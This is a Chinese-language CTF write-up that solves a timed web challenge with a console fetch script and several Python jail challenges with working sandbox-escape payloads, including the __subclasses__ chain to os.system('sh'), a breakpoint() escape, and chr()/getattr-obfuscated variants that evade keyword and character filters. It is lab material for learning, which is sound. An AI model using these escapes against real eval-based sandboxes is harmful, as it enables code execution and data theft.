打开源码查找 `fetch` 找到关键 JS 代码：

```js
fetch("/verify", {
    method: "POST",
    headers: {
        "Content-Type": "application/json",
    },
    body: JSON.stringify({
        answers: realCode,
        token: myToken
    })
})
```

所以只要访问 `/verify` ，用 json 格式发送正确的 `answers` 和 `token` 就能拿到 flag。

先搜 `realCode` 找到：

```js
generateRandomDigitArray(morseCodeLength)
    .then(({ real, guess }) => {
        realCode = real;
        guessCode = guess;
        renderContainer();
    });
```

说明 `realCode` 不是用户输入出来，而是由 `generateRandomDigitArray(morseCodeLength)` 获取出来。

搜 `generateRandomDigitArray` 找到 `generateRandomDigitArray()` 函数的定义：

```js
function generateRandomDigitArray(length) {
    return new Promise((resolve, reject) => {
        fetch(`/get_challenge?count=${length}`)
            .then((response) => {
                if (!response.ok) {
                    throw new Error(`HTTP error! status: ${response.status}`);
                }
                return response.json();
            })
            .then((data) => {
                if (data.error) {
                    reject(data.error);
                } else {
                    const real = data.numbers;
                    const guess = Array.from({ length }, () => null);
                    myToken = data.token; // 保存 token 到 myToken
                    resolve({ real, guess });
                }
            })
            .catch((error) => {
                console.error("Error fetching challenge data:", error);
                reject("Failed to fetch challenge data.");
            });
    });
}
```

同时还找到了 `myToken` ，这个函数的定义说明访问 `/get_challenge?count=${length}` 就能拿到对应的 myToken。

而这里需要实现 `generateRandomDigitArray(morseCodeLength)`，即访问 `/get_challenge?count=【morseCodeLength】`，所以查找 `morseCodeLength` ，找到关键代码：

```js
var morseCodeLength = 9;
```

**结论：**

1. 访问 `/get_challenge?count=9` 可以同时得到对应的 `realCode` 和 `myToken`。

   例如返回：

   ```txt
   {"numbers":[7,0,1,3,2,2,9,9,5],"token":"1777810223527_110ab024"}
   ```

2. 访问 `/verify` ，用 json 格式（application/json）发送正确的 `answers` 和 `token` 就能拿到 flag。

   例如 POST 传入：

   ```json
   {
       "answers": [7,0,1,3,2,2,9,9,5],
       "token": "1777810223527_110ab024"
   }
   ```

但是很可惜失败了，返回了：

```txt
{"correct":false,"flag":null,"message":"Challenge expired or not started"}
```

看来是存在时间限制，手动肯定是来不及了，在控制台中输入 JS 脚本完成：

```js
fetch("/get_challenge?count=9")
  .then(r => r.json())
  .then(data => {
    console.log(data);

    return fetch("/verify", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        answers: data.numbers,
        token: data.token
      })
    });
  })
  .then(r => r.json())
  .then(console.log);
```

## Misc

### Pyjail 0

先 nc 连上：

```bash
nc docker.qingcen.net 46407
```

回显：

```txt
Please enter the reverse of 'E8IFD92U' to continue: 
```

输入 `U29DFI8E` ，返回：

```txt
Guess where the flag is and then give me its file path:
```

输入 `/proc/self/environ` 或 `/proc/1/environ` 即可。

### Pyjail 1

src.py：

```python
def chall():
    user_input = input("Give me your code: ")

    # 过滤关键字
    forbidden_keywords = ['import', 'eval', 'exec', 'open', 'file']
    for keyword in forbidden_keywords:
        if keyword in user_input:
            print(f"Forbidden keyword detected: {keyword}")
            return
    
    result = eval(user_input)
```

题目提示：

```txt
flag 位置在 /tmp 下
```

过滤了 `import` ，用不了：

```python
__import__('os').system('cat /tmp/flag')
```

过滤了 `open` ，用不了：

```python
open('/tmp/flag').read()
```

过滤了 `eval` ，用不了：

```python
eval(input())
```

输入：

```python
().__class__.__base__.__subclasses__()
```

没有返回结果，忘记加 `print()` 了，欸嘿，输入：

```python
print(().__class__.__base__.__subclasses__())
```

把回显结果贴到 `1.txt` 里面，然后 `ctrl + H` 进行替换，把：

```txt
, <class
```

替换为：

```txt

<class
```

接着 `ctrl + F` 找 `os._wrap_close` ，然后就能根据 vscode 前的代码行数找到 `os._wrap_close` 在第 156 行，即索引为 [155]。

![image-20260504165016935](https://img.yanxisishi.top/images/2026/05/image-20260504165016935.png)

输入：

```python
().__class__.__base__.__subclasses__()[155].__init__.__globals__['system']('sh')
```

拿到交互式 shell，然后愉快地命令执行：

```bash
ls /tmp
```

返回 `flag.txt` 。

```bash
cat /tmp/flag.txt
```

返回 flag。

### Pyjail 2

src.py：

```python
def chall():
    user_input = input("Give me your code: ")

    # 过滤关键字
    forbidden_keywords = ['import', 'eval', 'exec', 'open', 'file']
    for keyword in forbidden_keywords:
        if keyword in user_input:
            print(f"Forbidden keyword detected: {keyword}")
            return
    
    # 过滤特殊字符
    forbidden_chars = ['.', '_', '[', ']', "'", '"']
    for char in forbidden_chars:
        if char in user_input:
            print(f"Forbidden character detected: {char}")
            return

    result = eval(user_input)
```

1. 进入调试模式：

   ```python
   breakpoint()
   ```

   再输入：

   ```python
   __import__('os').system('sh')
   ```

   拿到交互式 shell。

2. 用 `getattr()` 和 `chr()` 绕过：

   用 `getattr()` 代替点号，用 `chr()` 拼字符串，用 `getattr()` 调用内置字典的方法代替中括号 `[]` 取值。

   ```python
   # 原 payload 为：print(open('/tmp/flag.txt').read())
   print(getattr(getattr(chr(111)+chr(112)+chr(101)+chr(110))(chr(47)+chr(116)+chr(109)+chr(112)+chr(47)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)),chr(114)+chr(101)+chr(97)+chr(100))())
   ```

   但是由于 `getattr(chr(111)+chr(112)+chr(101)+chr(110))` 只能得到字符串 `open`，但字符串 `open` 不会自动变成函数 `open`，且 getattr() 至少需要两个参数：

   ```python
   getattr(对象, 属性名) 
   ```

   所以这段会报错，需要改成：

   ```python
   # 原 payload 为：print(open('/tmp/flag.txt').read())
   # 即：print(globals().get('__builtins__').open('/tmp/flag.txt').read())
   # 即：print(getattr(getattr(getattr(globals(),'get')('__builtins__'),'open')('/tmp/flag.txt'),'read')())
   print(getattr(getattr(getattr(globals(),chr(103)+chr(101)+chr(116))(chr(95)+chr(95)+chr(98)+chr(117)+chr(105)+chr(108)+chr(116)+chr(105)+chr(110)+chr(115)+chr(95)+chr(95)),chr(111)+chr(112)+chr(101)+chr(110))(chr(47)+chr(116)+chr(109)+chr(112)+chr(47)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)),chr(114)+chr(101)+chr(97)+chr(100))())
   ```

   或

   ```python
   # 原 payload 为：__import__('os').system('sh')
   # 即：globals().get('__builtins__').__import__('os').system('sh')
   # 即：getattr(getattr(globals(),'get')('__builtins__'),'__import__')('os').system('sh')
   # 即：getattr(getattr(getattr(globals(),'get')('__builtins__'),'__import__')('os'),'system')('sh')
   getattr(getattr(getattr(globals(),chr(103)+chr(101)+chr(116))(chr(95)+chr(95)+chr(98)+chr(117)+chr(105)+chr(108)+chr(116)+chr(105)+chr(110)+chr(115)+chr(95)+chr(95)),chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95))(chr(111)+chr(115)),chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109))(chr(115)+chr(104))
   ```

   或

   ```python
   # 原 payload 为：().__class__.__base__.__subclasses__()[155].__init__.__globals__['system']('sh')
   # 即：getattr(getattr(getattr(getattr(getattr(getattr((),'__class__'),'__base__'),'__subclasses__')(),'__getitem__')(155),'__init__'),'__globals__').get('system')('sh')
   # 即：getattr(getattr(getattr(getattr(getattr(getattr(getattr((),'__class__'),'__base__'),'__subclasses__')(),'__getitem__')(155),'__init__'),'__globals__'),'get')('system')('sh')
   getattr(getattr(getattr(getattr(getattr(getattr(getattr((),chr(95)+chr(95)+chr(99)+chr(108)+chr(97)+chr(115)+chr(115)+chr(95)+chr(95)),chr(95)+chr(95)+chr(98)+chr(97)+chr(115)+chr(101)+chr(95)+chr(95)),chr(95)+chr(95)+chr(115)+chr(117)+chr(98)+chr(99)+chr(108)+chr(97)+chr(115)+chr(115)+chr(101)+chr(115)+chr(95)+chr(95))(),chr(95)+chr(95)+chr(103)+chr(101)+chr(116)+chr(105)+chr(116)+chr(101)+chr(109)+chr(95)+chr(95))(155),chr(95)+chr(95)+chr(105)+chr(110)+chr(105)+chr(116)+chr(95)+chr(95)),chr(95)+chr(95)+chr(103)+chr(108)+chr(111)+chr(98)+chr(97)+chr(108)+chr(115)+chr(95)+chr(95)),chr(103)+chr(101)+chr(116))(chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109))(chr(115)+chr(104))
   ```

### Pyjail 3

src.py：

```python
def chall():
    user_input = input("Give me your code: ")
        
    try:
        result = eval(user_input, {"__builtins__": None}, {})
        # Hint: When __builtins__ is None, you need to be more creative...
        print("Code executed successfully!")
        if result is not None:
            print(f"Return value: {result}")
    except Exception as e:
        print(f"Execution error: {type(e).__name__}: {e}")
```

关键在：

```python
eval(user_input, {"__builtins__": None}, {})
```

代表内置函数区没了。

正常情况下，输入：

```python
open('/tmp/flag.txt').read()
```

正常环境里大概等价于：

```python
__builtins__.open('/tmp/flag.txt').read()
```

所以内置函数区没了会导致：

```python
open('/tmp/flag.txt').read()
# open 来自 __builtins__

__import__('os').system('sh')
# __import__ 来自 __builtins__

print(123)
# print 来自 __builtins__

globals()
# globals 来自 __builtins__

dir()
# dir 来自 __builtins__
```

这些都无法使用了。

但仍然可以输入：

```python
().__class__.__base__.__subclasses__()[155].__init__.__globals__['system']('sh')
```
